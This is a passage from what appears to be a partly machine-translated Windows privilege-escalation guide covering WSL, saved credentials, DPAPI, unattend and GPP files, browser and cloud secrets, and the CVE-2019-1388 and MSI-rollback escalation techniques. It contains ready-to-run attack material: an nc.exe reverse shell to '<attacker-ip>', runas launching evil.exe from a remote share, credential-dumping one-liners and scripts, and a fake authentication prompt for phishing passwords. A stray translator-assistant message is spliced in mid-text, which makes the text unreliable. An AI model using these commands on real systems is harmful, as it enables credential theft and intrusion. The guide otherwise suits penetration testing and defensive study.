### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
二进制 `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 中找到

如果你获得 root user，你可以在任意端口上监听（第一次你使用 `nc.exe` 在端口上监听时，它会通过 GUI 提示是否允许 `nc` 通过防火墙）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要以 root 身份轻松启动 bash，可以试试 `--default-user root`

你可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中浏览 `WSL` 文件系统

## Windows 凭据

### Winlogon 凭据
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 凭据管理器 / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault 存储用于服务器、网站和其他程序的用户凭据，**Windows** 可以自动为用户登录。乍一看，这似乎意味着用户可以将 Facebook、Twitter、Gmail 等凭据存储起来，以便通过浏览器自动登录。但事实并非如此。

Windows Vault 存储的是 **Windows** 可以自动用来为用户登录的凭据，这意味着任何 **Windows application that needs credentials to access a resource**（服务器或网站）**can make use of this Credential Manager** & Windows Vault，并使用所提供的凭据，而无需用户每次输入用户名和密码。

除非应用程序与 Credential Manager 交互，否则我认为它们不可能使用给定资源的凭据。因此，如果你的应用想要使用该 vault，它应该以某种方式从默认存储 vault **communicate with the credential manager and request the credentials for that resource**。

使用 `cmdkey` 列出机器上存储的凭据。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后你可以使用 `runas` 并加上 `/savecred` 选项以使用已保存的凭据。下面的示例通过 SMB 共享调用远程二进制文件。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用 `runas` 并提供一组凭据。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意：mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)，或来自[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

**Data Protection API (DPAPI)** 提供了一种对数据进行对称加密的方法，主要在 Windows 操作系统中用于对非对称私钥进行对称加密。该加密利用用户或系统的秘密作为熵的重要来源。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**。在涉及系统加密的场景中，它使用系统的域身份验证秘密。

使用 DPAPI 加密的用户 RSA 密钥存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录中，其中 `{SID}` 表示用户的 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)。**The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**，通常由 64 字节的随机数据组成。（需要注意的是，该目录的访问受限，不能通过 CMD 中的 `dir` 命令列出其内容，但可以通过 PowerShell 列出。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
你可以使用 **mimikatz module** `dpapi::masterkey` 并带适当参数（`/pvk` 或 `/rpc`）来解密它。

受主密码保护的 **凭据文件** 通常位于：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
你可以使用 **mimikatz module** `dpapi::cred` 并提供相应的 `/masterkey` 来解密。\
你可以使用 `sekurlsa::dpapi` 模块（如果你是 root）从 **memory** 中提取许多 **DPAPI** **masterkeys**。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** 通常用于 **scripting** 和自动化任务，作为方便存储加密凭据的一种方式。 这些凭据使用 **DPAPI** 保护，这通常意味着它们只能被在创建它们的同一台计算机上的相同用户解密。

要从包含它的文件中**解密** 一个 PS credentials，你可以执行：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 无线网络
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 已保存的 RDP 连接

你可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
并且在 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭据管理器**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查是否存在 `C:\Windows\CCM\SCClient.exe` .\
安装程序以 **run with SYSTEM privileges**, 许多易受 **DLL Sideloading (信息来自** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件和注册表 (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 注册表中的 SSH 密钥

SSH 私钥可以存储在注册表键 `HKCU\Software\OpenSSH\Agent\Keys` 中，所以你应该检查那里是否有任何有趣的内容：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果你在该路径中发现任何条目，它很可能是一个已保存的 SSH key。它以加密形式存储，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
关于该技术的更多信息： [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果 `ssh-agent` 服务未运行，且你希望它在开机时自动启动，请运行：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 看起来该技术不再有效。我尝试创建了一些 ssh 密钥，用 `ssh-add` 添加它们，并通过 ssh 登录到一台机器。注册表 HKCU\Software\OpenSSH\Agent\Keys 不存在，并且 procmon 在 asymmetric key authentication 期间没有识别出 `dpapi.dll` 的使用。

### 无人值守的文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
您也可以使用 **metasploit** 搜索这些文件：_post/windows/gather/enum_unattend_

示例内容：
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭证
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### 缓存的 GPP 密码

之前有一个功能可以通过 Group Policy Preferences (GPP) 在一组机器上部署自定义的本地管理员账户。然而，该方法存在严重的安全缺陷。首先，存储在 SYSVOL 中的 Group Policy Objects (GPOs) 作为 XML 文件，可以被任何域用户访问。其次，这些 GPP 中的密码使用公开文档化的默认密钥并通过 AES256 加密，任何经过身份验证的用户都可以解密。这造成了严重风险，可能允许用户获得提升的权限。

为缓解此风险，开发了一个函数，用于扫描本地缓存的包含非空 "cpassword" 字段的 GPP 文件。找到此类文件后，该函数解密密码并返回一个自定义的 PowerShell 对象。该对象包含有关 GPP 和文件位置的详细信息，帮助识别和修复该安全漏洞。

在 `C:\ProgramData\Microsoft\Group Policy\history` 或 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（早于 Windows Vista）_ 中搜索以下文件：

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**解密 cPassword：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web 配置
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
包含凭据的 web.config 示例：
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭证
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 请求 credentials

你可以随时**要求用户输入他自己的 credentials，或者甚至其他用户的 credentials**，如果你认为他可能知道的话（注意，**直接向 client 要求 credentials** 是非常**危险**）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含凭据的文件名**

已知曾经包含以**明文**或 **Base64** 形式保存的**密码**的文件
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
我需要该文件的内容才能进行翻译。请把 src/windows-hardening/windows-local-privilege-escalation/README.md 的文本粘贴到这里，或提供文件内容。我会按照你的规则翻译，保留代码、标签、路径、链接等不翻译。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭证

你也应检查回收站，查找其中的凭证

要**恢复由多个程序保存的密码**，可以使用： [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 注册表中

**其他可能包含凭证的注册表键**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史

你应该检查存储 **Chrome or Firefox** 密码的数据库（dbs）。\
还要检查浏览器的历史记录、书签和收藏夹，因为其中可能存有一些 **密码**。

从浏览器提取密码的工具：

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** 是 Windows 操作系统内的一项技术，允许不同语言的软件组件之间的 **相互通信**。每个 COM 组件通过类 ID (**CLSID**) 进行标识，每个组件通过一个或多个接口暴露功能，这些接口由接口 ID (**IIDs**) 标识。

COM 类和接口在注册表中分别定义于 **HKEY\CLASSES\ROOT\CLSID** 和 **HKEY\CLASSES\ROOT\Interface**。该注册表是由 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** 合并而成的，等同于 **HKEY\CLASSES\ROOT.**

在该注册表的 CLSID 下，你可以找到子键 **InProcServer32**，它包含一个指向 **DLL** 的 **default value**，以及一个名为 **ThreadingModel** 的值，其可以是 **Apartment** (单线程)、**Free** (多线程)、**Both** (单或多) 或 **Neutral** (线程中性)。

![](<../../images/image (729).png>)

基本上，如果你能够覆盖任何将被执行的 **DLLs**，当该 DLL 被不同用户执行时，你可能能够 **escalate privileges**。

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **文件和注册表中的通用密码搜索**

**搜索文件内容**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**在注册表中搜索键名称和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索 passwords 的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **是一个 msf** 插件。我创建此插件以**自动执行每个 metasploit POST module**，这些模块在受害者内搜索 credentials。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 会自动搜索本页中提到的所有包含 passwords 的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个很棒的工具，用于从系统中提取 password。

该工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 会搜索多个将这些数据以明文保存的工具中的 **sessions**, **usernames** 和 **passwords** (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

所谓的共享内存段，称为 **pipes**，用于实现进程间通信和数据传输。

Windows 提供了名为 **Named Pipes** 的功能，允许不相关的进程共享数据，甚至跨网络。它类似于客户端/服务器架构，角色定义为 **named pipe server** 和 **named pipe client**。

当数据由 **client** 通过 pipe 发送时，设置该 pipe 的 **server** 在拥有必要 **SeImpersonate** 权限的情况下可以**获取该 client 的身份**。识别一个通过你能够模拟的 pipe 进行通信的 **privileged process**，当该进程与您建立的 pipe 交互时，采用其身份就有机会**提升权限**。有关执行此类攻击的说明，可参考 [**here**](named-pipe-client-impersonation.md) 和 [**here**](#from-high-integrity-to-system)。

另外，下面的工具允许你**使用像 burp 这样的工具拦截 named pipe 通信：** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **而这个工具允许列出并查看所有 pipe 以查找 privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

请查看页面 **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

当以用户身份获得 shell 时，可能存在计划任务或其他正在执行的进程，它们会**在命令行上传递凭据**。下面的脚本每两秒捕获一次进程命令行，并将当前状态与之前的状态进行比较，输出任何差异。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

如果你可以访问图形界面（通过 控制台 或 RDP），并且 UAC 已启用，在某些 Microsoft Windows 版本中，非特权用户可以运行终端或任何其他进程，例如 "NT\AUTHORITY SYSTEM"。

这使得可以利用同一漏洞同时提升权限并绕过 UAC。此外，无需安装任何东西，过程中使用的可执行文件由 Microsoft 签名并发行。

一些受影响的系统包括以下：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用此漏洞，需要执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

阅读此文以 **learn about Integrity Levels**：


{{#ref}}
integrity-levels.md
{{#endref}}

然后 **阅读此文以了解 UAC 和 UAC bypasses：**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

该攻击基本上是滥用 Windows Installer 的 rollback 功能，在卸载过程中将合法文件替换为恶意文件。为此，攻击者需要创建一个 **malicious MSI installer**，用来劫持 `C:\Config.Msi` 文件夹，Windows Installer 会在卸载其他 MSI 包时将回滚文件存储到该文件夹，而回滚文件会被修改以包含恶意负载。

技术概要如下：

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- 创建一个 `.msi`，将一个无害文件（例如 `dummy.txt`）安装到一个可写入的文件夹（`TARGETDIR`）。
- 将安装程序标记为 **"UAC Compliant"**，以便 **non-admin user** 能运行它。
- 在安装后对该文件保持一个 **handle** 打开。

- Step 2: Begin Uninstall
- 卸载相同的 `.msi`。
- 卸载过程开始将文件移动到 `C:\Config.Msi` 并重命名为 `.rbf` 文件（回滚备份）。
- 使用 `GetFinalPathNameByHandle` **轮询打开的文件句柄**，以检测文件何时变成 `C:\Config.Msi\<random>.rbf`。

- Step 3: Custom Syncing
- 该 `.msi` 包含一个 **custom uninstall action (`SyncOnRbfWritten`)**，该操作：
- 在 `.rbf` 被写入时发出信号。
- 然后在继续卸载前 **等待** 另一个事件。

- Step 4: Block Deletion of `.rbf`
- 当收到信号时，**以不包含 FILE_SHARE_DELETE 的方式打开 `.rbf` 文件**——这将**阻止其被删除**。
- 然后**回传信号**以便卸载可以完成。
- Windows Installer 无法删除该 `.rbf`，因为它不能删除所有内容，**`C:\Config.Msi` 不会被移除**。

- Step 5: Manually Delete `.rbf`
- 你（攻击者）手动删除 `.rbf` 文件。
- 现在 **`C:\Config.Msi` 是空的**，可供劫持。

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 自行重新创建 `C:\Config.Msi` 文件夹。
- 设置 **弱 DACLs**（例如 Everyone:F），并保持一个带有 `WRITE_DAC` 的 handle 打开。

- Step 7: Run Another Install
- 再次安装该 `.msi`，并设置：
- `TARGETDIR`: 可写位置。
- `ERROROUT`: 触发强制失败的变量。
- 这次安装将用于再次触发 **rollback**，该过程会读取 `.rbs` 和 `.rbf`。

- Step 8: Monitor for `.rbs`
